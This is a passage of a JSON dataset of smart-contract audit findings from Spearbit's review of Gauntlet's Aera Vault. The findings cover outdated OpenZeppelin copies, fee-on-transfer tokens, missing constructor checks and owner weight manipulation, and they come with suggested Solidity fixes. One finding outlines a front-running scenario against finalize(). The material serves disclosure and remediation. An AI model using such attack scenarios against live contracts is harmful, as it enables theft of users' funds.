      "content": "## Security Assessment Report\n\n## Severity\n**Low Risk**\n\n## Context\nAeraVaultV1.sol#L4-L11\n\n## Description\nThe Aera Vault uses OpenZeppelin release 4.3.2, which is copied into their GitHub. The current release of OpenZeppelin is 4.6.0 and includes several updates and security fixes.\n\nThe copies of the OpenZeppelin files are also (manually) changed to adapt the import paths. This has the risk of making a mistake in the process.\n\n```solidity\nimport \"./dependencies/openzeppelin/SafeERC20.sol\";\nimport \"./dependencies/openzeppelin/IERC20.sol\";\nimport \"./dependencies/openzeppelin/IERC165.sol\";\nimport \"./dependencies/openzeppelin/Ownable.sol\";\nimport \"./dependencies/openzeppelin/ReentrancyGuard.sol\";\nimport \"./dependencies/openzeppelin/Math.sol\";\nimport \"./dependencies/openzeppelin/SafeCast.sol\";\nimport \"./dependencies/openzeppelin/ERC165Checker.sol\";\n```\n\n## Recommendation\nUse recent versions and consider OpenZeppelin best practices:\n\n- Quite a lot of projects seem to use NPM install, which leaves the risk for a supply chain attack on NPM. Another way would be to retrieve it from the OpenZeppelin releases repository, but this also leaves the risk for a GitHub supply chain attack.\n- Preferably don’t change the contracts to prevent mistakes.\n- OpenZeppelin has a way to alert projects of vulnerabilities before public disclosures.\n- Monitor the updates to the releases.\n- Update to a new release if relevant bugfixes are applied. With every large release, make sure a recent version of the OpenZeppelin contracts is used (but preferably also somewhat battle tested).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7104",
      "title": "Frequent calling of calculateAndDistributeManagerFees() lowers fees",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- AeraVaultV1.sol#L682-L690\n- IManagerAPI.sol#L24-L25\n\n## Description\nThe `viacalculateAndDistributeManagerFees()` function sends a percentage of the Pool to the Manager. If this function is called too frequently, the Manager's fees will be lower.\n\n**For example:**\n- If the Manager calls it twice, receiving 1% both times, the effective fee becomes:\n  - \\(1\\% + 1\\% \\times (100\\% - 1\\%) = 1.99\\%\\)\n  \n- If the Manager waits longer until they have earned 2%, they effectively receive 2%, which is slightly more than 1.99%.\n\n- If the function is called very frequently, the fees approach 0 (especially considering rounding down), though the gas costs would be very high.\n\nThe Manager can accidentally trigger this by calling `claimManagerFees()`. The Owner may also inadvertently or intentionally do this (e.g., using a 0 balance change) by calling `deposit()`, `withdraw()`, or `setManager()`.\n\n**Note:** Rounding errors can exacerbate this issue. \n\nAlso see the following issue: Possible rounding down of fees.\n\n```solidity\nfunction claimManagerFees() {\n    calculateAndDistributeManagerFees(); // get a percentage of the Pool\n}\n```\n\n## Recommendation\nEncourage Managers to avoid claiming fees too frequently. The Natspec comments regarding the `claimManagerFees()` function in the `IManagerAPI.sol` contract indicate that this function should not be called frequently.\n\nSince the Owner is ultimately responsible for the Vault and the gas costs likely outweigh the fees, it may not be worth taking action.\n\n## Gauntlet\nAdded comment on `claimManagerFees()` in PR #138.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7103",
      "title": "Ensure vault’s deployment integrity",
      "impact": "LOW",
      "content": "## Severity Report\n\n## Severity\n**Low Risk**\n\n## Context\n**AeraVaultV1.sol**\n\n## Description\nThe treasury could deploy on purpose or by accident a slightly different version of the contract and introduce bugs or backdoors. This might not be recognized by parties taking on Manager responsibilities (e.g. usually Gauntlet will be involved here).\n\n## Recommendation\nConsider using a factory to deploy the contract(s), so only parameters can be set.\n\n## Gauntlet\nWe are ok with trusting the treasury to deploy the validator. The main reason being is that we don’t see a simple way to parametrize validators at the moment and each treasury partner will be highly trusted early on so we’d be starting with permissive validators and then leaning on treasuries to suggest some custom validators first.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7102",
      "title": "Possible mismatch between Validator.count and AeraVault assets count",
      "impact": "MEDIUM",
      "content": "## Medium Risk Report\n\n## Severity \nMedium Risk\n\n## Context \n- `PermissiveWithdrawalValidator.sol#L13`\n- `AeraVaultV1.sol#L456-L514`\n\n## Description \nA weak connection between `WithdrawalValidator` and `Aera Vault` could lead to the inability to withdraw from a Vault.\n\nConsider the following scenario:  \nThe Validator is deployed with a `tokenCount` less than `Vault.getTokens().length`. Inside the `withdraw()` function, we reference the following code block:\n\n```solidity\nuint256[] memory allowances = validator.allowance();\nuint256[] memory weights = getNormalizedWeights();\nuint256[] memory newWeights = new uint256[](tokens.length);\nfor (uint256 i = 0; i < tokens.length; i++) {\n    if (amounts[i] > holdings[i] || amounts[i] > allowances[i]) {\n        revert Aera__AmountExceedAvailable(\n            address(tokens[i]),\n            amounts[i],\n            holdings[i].min(allowances[i])\n        );\n    }\n}\n```\n\nA scenario where `allowances.length < tokens.length` would cause this function to revert with an \"Index out of bounds\" error. The only way for the Treasury to withdraw funds would be via the `finalize()` method which has a time delay.\n\n## Recommendation \nEnsure that when `Aera Vault` and `Validator` are deployed, `Validator.count` is the same as the number of assets managed by the vault.\n\nA potential solution is to create a Factory contract that will deploy both the `Aera Vault` and the `Validator`. In such a case, remember to correctly set up the Aera Vault Ownable contract because the current deployer is also the Vault’s owner, and in the case of a Factory, the owner of the vault would be the Factory itself. This would cause all `onlyOwner` calls to revert. \n\nAdditionally, see the following issue: **Ensure integrity of deployment of vault**.\n\n## Gauntlet \nI think we are okay with trusting the treasury to deploy the validator. The main reason being is that we don’t see a simple way to parametrize validators at the moment, and each treasury partner will be highly trusted early on. So we’d be starting with permissive validators and then leaning on treasuries to suggest some custom validators first.\n\nChecked on `allowances.length` added in PR #141.\n\n## Spearbit \nAcknowledged.",
      "summary": "\nThis bug report is about a weak connection between WithdrawalValidator and Aera Vault, which could lead to the inability of withdrawing from a Vault. The problem is that if the Validator is deployed with a tokenCount that is less than Vault.getTokens().length, the withdraw() function would cause an Index out of bounds error and the only way for the Treasury to withdraw funds would be via the finalize() method, which has a time delay.\n\nThe recommendation is to ensure that when Aera Vault and Validator are deployed, Validator.count is the same as the number of assets managed by the vault. A potential solution is to create a Factory contract that will deploy both the Aera Vault and the Validator, and remember to correctly set up the Aera Vault Ownable contract. Additionally, there is an issue to Ensure integrity of deployment of vault.\n\nGauntlet suggested to trust the Treasury to deploy the validator, as they don't see a simple way to parametrize validators at the moment, and each treasury partner will be highly trusted early on. Spearbit acknowledged the suggestion and checked on allowances.length added in PR #141.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7101",
      "title": "AeraVault constructor is not checking all the input parameters",
      "impact": "MEDIUM",
      "content": "## Risk Assessment Report\n\n## Severity: Medium Risk\n### Context\nAeraVaultV1.sol#L260-L345\n\n### Description\nThe Aera Vault constructor has the role to handle Balancer’s ManagedPool deployment. The constructor should increase the number of user input validations, and the Gauntlet team should be aware of the possible edge cases that could occur since the deployment of the Aera Vault is handled directly by the Treasury and not by the Gauntlet team itself. \n\nWe are going to list all the worst-case scenarios that could happen given that the deployments are handled by the Treasury:\n\n1. The factory could be a wrapper contract that will deploy a ManagedPool. This means that the deployer could pass correct parameters to the Aera Vault to pass these checks but could use custom and malicious parameters on the factory wrapper to deploy the real Balancer pool.\n2. The `swapFeePercentage` value is not checked. On Balancer, the deployment will revert if the value is not within this range (>= 1e12 (0.0001%) and <= 1e17 (10% - this fits in 64 bits)). Without any check, the Gauntlet accepts to follow Balancer’s swap requirements.\n3. The `manager_` is not checked. They could set the manager as the Treasury (owner of the vault) itself. This would give the Treasury full power to manage the Vault. At least these values should be checked: `address(0)`, `address(this)`, or `owner()`. The same checks should also be done in the `setManager()` function.\n4. `validator_` could be set to a custom contract that will give full allowances to the Treasury. This would make the `withdraw()` act like `finalize()`, allowing withdrawal of all funds from the vault/pool.\n5. `noticePeriod_` has only a max value check. The Gauntlet team explained that a time delay between the initialization of the finalize process and the actual finalize is needed to prevent the Treasury from being able to instantly withdraw all funds. Not having a min value check allows the Treasury to set the value to 0, leading to no delay between `initiateFinalization()` and `finalize()` because `noticeTimeoutAt == block.timestamp`.\n6. `managementFee_` has no minimum value check. This would allow the Treasury to not pay the manager, because the `managerFeeIndex` would always be 0.\n7. `description_` can be empty. From the Specification PDF, the description of the vault is meant to “Describe vault purpose and modeling assumptions for differentiating between vaults.” Being empty could lead to a bad UX for external services needing to differentiate between different vaults.\n\nThese are all the checks that are done directly by Balancer during deployment via the Pool Factory:\n- BasePool constructor#L94-L95: min and max number of tokens.\n- BasePool constructor#L102: token array must be sorted following Balancer specification (sorted by token address).\n- BasePool constructor calling `_setSwapFeePercentage`: min and max value for `swapFeePercentage`.\n- BasePool constructor calling `vault.registerTokens`: token address uniqueness (can’t have the same token in the pool), and it checks that token != `IERC20(0)`. Following the path BasePool is calling `vault.registerTokens`, that should call function `_registerMinimalSwapInfoPoolTokens` from `MinimalSwapInfoPoolsBalance`.\n- ManagedPool constructor calling `_startGradualWeightChange`: checks min value of weight and that the total sum of the weights is equal to 100%. `_startGradualWeightChange` internally checks that `endWeight >= WeightedMath._MIN_WEIGHT` and `normalizedSum == FixedPoint.ONE`.\n\n### Recommendation\n- Create a factory to wrap both AeraVault and Validator deployment to reduce the influence and possible malicious attacks from external actors.\n- Add a custom min/max value check for `swapFeePercentage` on top of Balancer’s check if needed.\n- Add checks on `manager_` value to prevent an empty manager (`address(0)`) or that the manager and AeraVault owner will be equal to the Treasury itself.\n- Add a min value check to the `noticePeriod_` parameter if needed to prevent too small a time between `initiateFinalization` and `finalize` call.\n- Add a min value check to the `managementFee_` parameter if needed to prevent the Treasury from not paying the manager.\n- Add a check on `description_` to prevent deploying an AeraVault with an empty description that would create confusion on web applications displaying similar vaults.\n- Check meticulously that future versions of Balancer still maintain the same checks listed above. Consider replicating those checks during deployment to be future-proof.\n\nWe also recommend carefully documenting the possible consequences of supporting \"special\" types of tokens:\n- Token with more than 18 decimals that are not supported by Balancer.\n- Token with a small number of decimals.\n- ERC777 tokens.\n- Token with fees on transfer.\n- Token with blacklisting capabilities.\n\n### Gauntlet\nIn our trust model, we only decide to manage the vault if it has been correctly deployed. Thus, leaving the focus on human error, I think the following are actionable:\n1. Add checks on `manager_` value to prevent an empty manager (`address(0)`) or that the manager and Aera Vault owner will be equal to the Treasury itself.\n2. Add a check on `description_` to prevent deploying an Aera Vault with an empty description that would create confusion on web applications displaying similar vaults.\n\nI’ll also take a documentation action for these:\n- Token with more than 18 decimals that are not supported by Balancer.\n- Token with a small number of decimals.\n- ERC777 tokens.\n- Token with fees on transfer.\n- Token with blacklisting capabilities.",
      "summary": "\nThe bug report is about the Aera Vault constructor which handles Balancer’s ManagedPool deployment. The report lists the possible worst-case scenarios that could happen if the deployments are handled by the Treasury. These scenarios include factory wrappers that could pass malicious parameters, swapFeePercentage not being checked, manager_ not being checked, validator_ not being checked, noticePeriod_ not having a min value check, managementFee_ not having a min value check, and description_ being empty. The report also lists the checks done directly by Balancer during deployment via the Pool Factory. \n\nThe recommendation is to create a factory to wrap both AeraVault and Validator deployment, add custom min/max value check for swapFeePercentage, add checks on manager_ value, add a min value check to the noticePeriod_ parameter, add a min value check to the managementFee_ parameter, add a check on description_, and check meticulously that future Balancer’s version still maintain the same checks listed above. The report also recommends carefully documenting the possible consequences of supporting \"special\" types of tokens.\n\nThe actionable items from the trust model are to add checks on manager_ value to prevent an empty manager, and add a check on description_ to prevent to deploy a Aera Vault with an empty description. The documentation action is to document the possible consequences of supporting \"special\" types of tokens.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7100",
      "title": "enableTradingWithWeights allow the Treasury to change the pool’s weights even if the swap is not disabled",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\nAeraVaultV1.sol#L574-L583\n\n## Description\n`enableTradingWithWeights` is a function that can only be called by the owner of the Aera Vault contract and that should be used only to re-enable the swap feature on the pool while updating token weights. The function does not verify if the pool’s swap feature is enabled and for this reason, it allows the Treasury to act as the manager who is the only actor allowed to change the pool weights. The function should add a check to ensure that it is only callable when the pool’s swap is disabled.\n\n## Recommendation\nUpdate the function to revert when the pool’s swap is enabled.\n\n```solidity\nfunction enableTradingWithWeights(uint256[] calldata weights)\nexternal\noverride\nonlyOwner\nwhenInitialized\n{\n  bool isSwapEnabled = pool.getSwapEnabled();\n  if( isSwapEnabled ) {\n    revert Aera__PoolSwapIsAlreadyEnabled();\n  }\n  uint256 timestamp = block.timestamp;\n  pool.updateWeightsGradually(timestamp, timestamp, weights);\n  setSwapEnabled(true);\n}\n```\n\n## Gauntlet\nFixed in PR #126.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about an issue with the AeraVaultV1.sol#L574-L583 contract, which is a function called enableTradingWithWeights. This function is only supposed to be called by the owner of the contract and should be used to re-enable the swap feature on the pool while updating token weights, however, it does not verify if the pool’s swap feature is enabled. This means that the Treasury is able to act as the manager and change the pool weights, which is not allowed.\n\nThe recommendation is to update the function to revert when the pool’s swap is enabled. This was fixed in PR #126 and acknowledged by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation",
        "Bypass limit"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7099",
      "title": "Fee on transfer can block several functions",
      "impact": "MEDIUM",
      "content": "## Token Transfer Fee Risk Analysis\n\n## Severity\n**Medium Risk**\n\n## Context\n`AeraVaultV1.sol#L456-L514`\n\n## Description\nSome tokens have a fee on transfer, for example USDT. Usually, such a fee is not enabled but could be re-enabled at any time. With this fee enabled:\n\n- The `withdrawFromPool()` function would receive slightly fewer tokens than the amounts requested from Balancer.\n- This could cause the next `safeTransfer()` call to fail because there are not enough tokens inside the contract. \n- Consequently, `withdraw()` calls will fail.\n\nThe functions `deposit()` and `calculateAndDistributeManagerFees()` can also fail due to similar code.\n\n> **Note:** The function `returnFunds()` is more robust and can handle this problem.\n\n> **Note:** The problem can be alleviated by sending additional tokens directly to the Aera Vault contract to compensate for fees, lowering the severity of the problem to medium.\n\n### Code Snippet\n```solidity\nfunction withdraw(uint256[] calldata amounts) ... {\n    ...\n    withdrawFromPool(amounts); // could get slightly less than amount with a fee on transfer\n    ...\n    for (uint256 i = 0; i < amounts.length; i++) {\n        if (amounts[i] > 0) {\n            tokens[i].safeTransfer(owner(), amounts[i]); // could revert if the full amounts[i] isn't available\n        }\n    }\n    ...\n}\n```\n\n## Recommendation\nCheck the `balanceOf()` tokens before and after a `safeTransfer()` or `safeTransferFrom()`. Use the difference as the amount of tokens sent/received.",
      "summary": "\nThis bug report is about the AeraVaultV1.sol, which is a contract that allows users to deposit and withdraw tokens from a pool. The bug occurs when a token has a fee on transfer, which is usually not enabled but could be re-enabled at any time. When this fee is enabled, the withdrawFromPool() function will receive slightly less tokens than the amounts requested from Balancer, causing the next safeTransfer() call to fail because there are not enough tokens inside the contract. This means withdraw() calls will fail. Functions deposit() and calculateAndDistributeManagerFees() can also fail because they have similar code.\n\nThe bug can be alleviated by sending additional tokens directly to the Aera Vault contract to compensate for fees, lowering the severity of the problem to medium. The function returnFunds() is more robust and can handle this problem. The recommendation to fix this bug is to check the balanceOf() tokens before and after a safeTransfer() or safeTransferFrom() and use the difference as the amount of tokens sent/received.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7098",
      "title": "Consult with Balancer team about best approach to add and remove funds",
      "impact": "MEDIUM",
      "content": "## Security Report\n\n**Severity:** Medium Risk  \n**Context:** AeraVaultV1.sol  \n\n**Description:**  \nThe Aera Vault uses AssetManager’s functionality of the function `managePoolBalance()` to add and remove funds. The standard way to add and remove funds in Balancer is via `joinPool()` / `exitPool()`. Using the `managePoolBalance()` function might lead to future unexpected behavior. Additionally, this disables the capacity to implement the original intention of AssetManager's functionality, e.g., storing funds elsewhere to generate yield.\n\n**Recommendation:**  \nDouble-check with the Balancer team on the best approach to implement. If either way is nonoptimal, ask them to implement the functionality to support this. If the `joinPool()` / `exitPool()` path is recommended by the Balancer team, it can probably be implemented in the following way:\n\n- Limit access to `joinPool()` via allowlist (as is already done).\n- Limit access to `exitPool()` via a custom pool with an `onExit()` callback function (which could also integrate `allowance()`).\n- Adjust the spot price after `joinPool()` / `exitPool()` via `updateWeights()`.\n- Perhaps use the AUM (`managementAumFeePercentage`) fees.\n- Only keep the BPT (pool tokens) in the vault.\n\n**Gauntlet:**  \nBoth ways are probably not the \"intended\" use case; the current version seems a bit more elegant code-wise. We will get in touch with the Balancer team about the best way to use these low-level functions.\n\n**Spearbit:**  \nAcknowledged.",
      "summary": "\nThis bug report is about the Aera Vault, which uses AssetManager’s functionality of function managePoolBalance() to add and remove funds. There is a potential for unexpected behavior, and this also disables the capacity to store funds elsewhere to generate yield. It is recommended to doublecheck with the Balancer team which is the best approach to implement. If either ways are nonoptimal, they should be asked to implement the functionality to support this. \n\nIf the Balancer team recommends the joinPool() /exitPool() path, it can be implemented by limiting access to joinPool() via allowlist, limiting access to exitPool() via a custom pool with an onExit() callback function, adjusting the spotprice after joinPool() /exitPool() via updateWeights(), using the AUM fees, and only keeping the BPT (pool tokens) in the vault. \n\nGauntlet and Spearbit have acknowledged the issue and will get in touch with the Balancer team about the best way to use these low-level functions.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7097",
      "title": "safeApprove indepositToken could revert for non-standard token like USDT",
      "impact": "MEDIUM",
      "content": "## Security Analysis\n\n## Severity\n**Medium Risk**\n\n## Context\nAeraVaultV1.sol#L893\n\n## Description\nSome non-standard tokens like USDT will revert when a contract or a user tries to approve an allowance when the spender allowance has already been set to a non-zero value. In the current code, we have not seen any real problem with this fact because the amount retrieved via `depositToken()` is approved and sent to the Balancer pool via `joinPool()` and `managePoolBalance()`. Balancer transfers the same amount, lowering the approval to 0 again. \n\nHowever, if the approval is not lowered to exactly 0 (due to a rounding error or another unforeseen situation), then the next approval in `depositToken()` will fail (assuming a token like USDT is used), blocking all further deposits.\n\n**Note:** Set to medium risk because the probability of this happening is low, but the impact would be high. We also should note that OpenZeppelin has officially deprecated the `safeApprove` function, suggesting to use instead `safeIncreaseAllowance` and `safeDecreaseAllowance`.\n\n## Recommendation\nAdopt a safer approach to cover edge cases such as the abovementioned USDT token and implement the following solution:\n\n```solidity\nfunction depositToken(IERC20 token, uint256 amount) internal {\n    token.safeTransferFrom(owner(), address(this), amount);\n    // - token.safeApprove(address(bVault), amount);\n    uint256 allowance = token.allowance(address(this), address(bVault));\n    if (allowance > 0) {\n        token.safeDecreaseAllowance(address(bVault), allowance);\n    }\n    token.safeIncreaseAllowance(address(bVault), amount);\n}\n```\n\nPlease note that the amount that should be used as a parameter for `safeIncreaseAllowance` should follow the recommendations written in issue \"Fee on transfer can block several functions\".",
      "summary": "\nThis bug report describes an issue with non-standard tokens like USDT, which can cause a transaction to revert when a contract or user attempts to set an allowance when the spender allowance has already been set to a non-zero value. Currently, this is not an issue as the amount is approved and sent to the Balancer pool, which then transfers the same amount, lowering the approval to 0. However, if the approval is not lowered to exactly 0, then the next approval in depositToken() will fail, blocking further deposits. This is considered a medium risk as the probability of this happening is low but the impact would be high.\n\nThe report then recommends a safer approach which implements the following solution: using token.safeTransferFrom(), token.safeDecreaseAllowance(), and token.safeIncreaseAllowance() functions. The amount used as a parameter for safeIncreaseAllowance should follow the recommendations written in the issue Fee on transfer can block several functions. \n\nIn conclusion, this bug report describes an issue with non-standard tokens like USDT, which can cause a transaction to fail if the approval is not lowered to exactly 0. The report recommends a safer approach which uses token.safeTransferFrom(), token.safeDecreaseAllowance(), and token.safeIncreaseAllowance() functions, and suggests that the amount used as a parameter for safeIncreaseAllowance should follow the recommendations written in the issue Fee on transfer can block several functions.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "SafeApprove",
        "USDT"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7096",
      "title": "Front-running attacks on finalize could affect received token amounts",
      "impact": "MEDIUM",
      "content": "## Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\n- `AeraVaultV1.sol#L539`\n- `AeraVaultV1.sol#L899-L910`\n\n## Description\nThe `returnFunds()` function (called by `finalize()`) withdraws the entire holdings in the Balancer pool but does not allow the caller to specify and enforce the minimum amount of received tokens. Without such a check, the `finalize()` function could be susceptible to a front-running attack.\n\n### Potential Exploit Scenario\n1. The notice period has passed, and the Treasury calls `finalize()` on the Aera vault. Assume the Balancer pool contains 1 WETH and 3000 DAI, and that WETH and DAI weights are both 0.5.\n2. An attacker front-runs the Treasury’s transaction and swaps in 3000 DAI to get 0.5 WETH from the pool.\n3. As an unexpected result, the Treasury receives 0.5 WETH and 6000 DAI. Therefore, an attacker can force the Treasury to accept the trade that they offer.\n\nAlthough the Treasury can execute a reverse trade in another market to recover the token amount and distribution, not every Treasury can execute such a trade (e.g., if a timelock controls it). Notice that the attacker may not profit from the swap because of slippage, but they could be incentivized to perform such an attack if it causes considerable damage to the Treasury.\n\n## Recommendation\nPossible mitigations include:\n- Allowing the caller to specify the minimum amount of each token and reverting the transaction if not enough tokens are available.\n- Adopting a two-step finalization pattern. First, disable trading and check if the token amounts in the Balancer pool are as desired. If not, enable trading again and let arbitragers rebalance the pool. Once rebalanced, finalize the vault.\n- Use Flashbots to reduce front-running probabilities.\n\n## Gauntlet\nBased on our latest thinking, trading should be paused when `initiateFinalization` is run. That should resolve this issue.\n\n## Spearbit\n`setSwapEnabled(false)` has been added in `initiateFinalization()` in PR #137. It is worth noting that pausing trading does not completely solve the issue. If `initiateFinalization()` happens to be front-run (although not profitable for a frontrunner, it could still happen), then the token distributions could still be off. This situation should probably be detected (manually?) and corrected with `enableTradingWithWeights()` and `disableTrading()`.\n\n## Gauntlet\nI think there are 2 things that are important:\n- If the Treasury is using withdraw and asking for a specific amount of tokens, they should not receive less than that. If there happens to be a front-running transaction, just like in an AMM, they may not be able to withdraw what they want.\n- If the Treasury is finalizing, they should expect to retain a decent amount of the value of the pool, but since it’s a liquidity share in an AMM, there aren’t guarantees about the specific ratios of token amounts. The only guarantee is the relationship between token weights, balances, and spot prices.\n\n## Spearbit\nThe value indeed stays the same. Only if the token distribution would be important would you want to solve this. Assuming the token distribution doesn’t matter, you might as well keep the code as is (unless there are other reasons to change).\n\n**Note:** [e.g., a front-run of `initiateFinalization()` + trade pause has the same effect as a front-run of `finalize()` while trade hasn’t been paused.]\n\n## Gauntlet\nI still like the proposal as we see other benefits in pausing trading. Since trading is primarily a means of rebalancing execution, we can shut it off post-initiation of finalization to mitigate impermanent loss for the Treasury.\n\n## Spearbit\nAcknowledged. Beware that `enableTradingWithWeights()`, `enableTradingRiskingArbitrage()`, and `disableTrading()` still work after `initiateFinalization()`. This could be put to good use but also unwanted (in that case, additional checks are required in these functions).",
      "summary": "\nA bug report has been raised regarding the returnFunds() function in the AeraVaultV1.sol smart contract. The function withdraws the entire holdings in the Balancer pool but does not allow the caller to specify and enforce the minimum amount of received tokens. This leaves the finalize() function vulnerable to a front-running attack. In this type of attack, an attacker could front-run the Treasury’s transaction, swap in tokens to get a larger amount of tokens, and force the Treasury to accept an unfavorable trade. \n\nThe report recommends a few possible mitigations including allowing the caller to specify the minimum amount of each token, adopting a two-step finalization pattern, and using Flashbots to reduce front-running probabilities. Gauntlet and Spearbit discussed the possibility of pausing trading when initiateFinalization is run and adding a check to enableTradingWithWeights, enableTradingRiskingArbitrage, and disableTrading. Pausing trading would mitigate impermanent loss for the Treasury. It was also noted that enableTradingWithWeights, enableTradingRiskingArbitrage, and disableTrading still work after initiateFinalization, so additional checks are required to prevent unwanted behavior.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7095",
      "title": "Owner can circumvent allowance() viaenableTradingWithWeights()",
      "impact": "MEDIUM",
      "content": "## Security Assessment Report\n\n## Severity\n**Medium Risk**\n\n## Context\nAeraVaultV1.sol#L564-L593\n\n## Description\nThe vault Owner can set arbitrary weights via `disableTrading()` and then call `enableTradingWithWeights()` to set the spot price and create arbitrage opportunities for himself. This way, `allowance()` in `withdraw()` checks, which limit the amount of funds an owner can withdraw, can be circumvented. Something similar can be done with `enableTradingRiskingArbitrage()` in combination with sufficient time.\n\nAlso see the following issues:\n- `allowance()` doesn’t limit `withdraw()`\n- `enableTradingWithWeights` allows the Treasury to change the pool’s weights even if the swap is not disabled\n- Separation of concerns between Owner and Manager\n\n### Functions\n```solidity\nfunction disableTrading() ... onlyOwnerOrManager ... {\n    setSwapEnabled(false);\n}\n\nfunction enableTradingWithWeights(uint256[] calldata weights) ... onlyOwner ... {\n    ...\n    pool.updateWeightsGradually(timestamp, timestamp, weights);\n    setSwapEnabled(true);\n}\n\nfunction enableTradingRiskingArbitrage() ... onlyOwner ... {\n    setSwapEnabled(true);\n}\n```\n\n## Recommendation\nConsider allowing only the manager to execute the `disableTrading()` function, although this also has disadvantages. Additionally, use an oracle to determine the spot price (as is already envisioned for the next versions of the protocol).\n\n## Gauntlet\nFor safety reasons, we want the treasury to have full control over trading. Given our current trust model, this won’t be an issue for V1, so no action will be taken at this time.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about an issue in AeraVaultV1.sol. It is a medium risk bug that allows the vault owner to set arbitrary weights and then call enableTradingWithWeights() to set the spot price and create arbitrage opportunities for himself, thus bypassing the allowance() checks. This issue can also be done with enableTradingRiskingArbitrage() in combination with sufficient time. The recommendation is to consider allowing only the manager to execute the disableTrading() function and to use an oracle to determine the spot price. However, given the current trust model, this won't be an issue for V1 so no action will be taken at this time.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Admin"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "7094",
      "title": "Implement a function to claim liquidity mining rewards",
      "impact": "HIGH",
